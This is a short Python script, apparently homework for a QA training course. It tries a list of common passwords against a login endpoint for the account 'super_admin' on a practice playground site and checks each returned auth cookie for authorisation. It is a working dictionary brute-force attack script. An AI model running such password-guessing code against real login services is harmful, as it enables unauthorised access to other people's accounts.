import requests

list_of_passwords = [
    "password", "123456", "123456789", "12345678", "12345", "qwerty", "abc123",
    "football", "1234567", "monkey", "111111", "letmein", "dragon", "1234",
    "baseball", "sunshine", "iloveyou", "trustno1", "123123", "adobe123",
    "welcome", "login", "admin", "princess", "qwerty123", "1234567890", "solo",
    "1q2w3e4r", "master", "666666", "photoshop", "1qaz2wsx", "qwertyuiop",
    "ashley", "mustang", "121212", "starwars", "654321", "bailey", "access",
    "flower", "555555", "passw0rd", "shadow", "lovely", "7777777", "michael",
    "!@#$%^&*", "jesus", "password1", "superman", "hello", "charlie", "888888",
    "696969", "hottie", "freedom", "aa123456", "qazwsx", "ninja", "azerty",
    "loveme", "whatever", "donald", "batman", "zaq1zaq1", "0", "123qwe", "Football"
]

for pswrd in list_of_passwords:

    url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
    params = {"login": "super_admin", "password": pswrd}
    response = requests.post(url, data=params)

    print('password:', pswrd)
    print('cookie:', dict(response.cookies)['auth_cookie'])

    url_check = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

    params_check = {"auth_cookie": dict(response.cookies)['auth_cookie']}

    response_check = requests.post(url_check, data=params_check)

    if response_check.text == "You are authorized":
        print('response:', response_check.text)